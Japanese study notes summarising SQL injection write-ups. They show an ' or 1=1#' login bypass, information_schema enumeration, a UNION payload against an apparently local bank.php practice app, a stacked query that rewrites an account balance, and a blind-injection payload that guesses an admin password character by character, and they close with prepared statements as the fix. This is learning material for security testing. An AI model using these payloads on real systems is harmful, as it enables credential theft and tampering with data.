# SQLiのWriteUpをまとめる

## 脆弱性の見つけ方
* 画面入力のパラメータに[']を入れる
```SQL
SELECT B FROM C WHERE name = '''
```
データベースエラーが表示されたら脆弱性
![](/%E8%84%86%E5%BC%B1%E6%80%A7%E8%A8%BA%E6%96%AD/web%E8%84%86%E5%BC%B1%E6%80%A7/img/SQLikensa.png)

* GETパラメータやPOSTの値を変更してリクエストする

## 影響
![](/%E8%84%86%E5%BC%B1%E6%80%A7%E8%A8%BA%E6%96%AD/web%E8%84%86%E5%BC%B1%E6%80%A7/img/SQLiinfluence.png)

## 脆弱性の攻撃
* どのようなリクエストを投げたら、どのようなSQL文が
APサーバーからDBサーバーに投げられるのか、想像することが
重要

```SQL
SELECT * FROM Users WHERE id = "ユーザ入力値"
AND pass = "ユーザ入力値";
```

というＳＱＬだったら
```SQL
SELECT * FROM Users WHERE id = "" or 1=1#"
```
とするとすべての結果がでる。

**「" or 1=1#"」**が入力
エスケープを自動的にしてくれないときは
**「"%20or1=1#"]**
また#は後ろのＳＱＬをコメントアウトするための
ものであるがDBによっては”--"を最後に入れることも
おおい


以下で利用されているＳＱＬを推測するのがとても大事
* information_schema
→すべてのDBに関する情報を格納する場所

    * information_schema.tables
    → MySQLに登録されているすべてのテーブルの一覧

    * information_schema.colums
    → MySQLに登録されているすべてのカラムの一覧

* sqliteのテーブルスキーマ情報
https://www.dbonline.jp/sqlite/#section_ini
https://www.dbonline.jp/sqlite/table/index2.html

* UNION
→絶対使い慣れること。カラム数と属性を合わせること

```URI
http://localhost/Users/_personal/Web/Scenario1223/VulSoft/bank.php?page=4&account_id=0 OR 1=1 UNION ALL SELECT id, name, password, NULL, NULL, NULL FROM user
```

### 複文
```
200002; UPDATE account SET balance = 1000000 WHERE account_id = 100005
```

INSERTやUPDATEしているであろう項目に対して「;」区切りでinsertやupdateを追加する

### ブラインドSQL

```
sato'AND SUBSTR((SELECT password FROM user WHERE id='admin'),1,1) = 'a'--
```

idが[admin]であるとわかっていれば、パスワードの1文字目を抜き出して比較を
総当たりしていけばパスワードを推測できるという技

シェルでBruteForceしている例
https://orebibou.com/ja/home/201901/20190104_001/


## 対策

* プリペアードステートメント（静的プレースホルダ）を用いる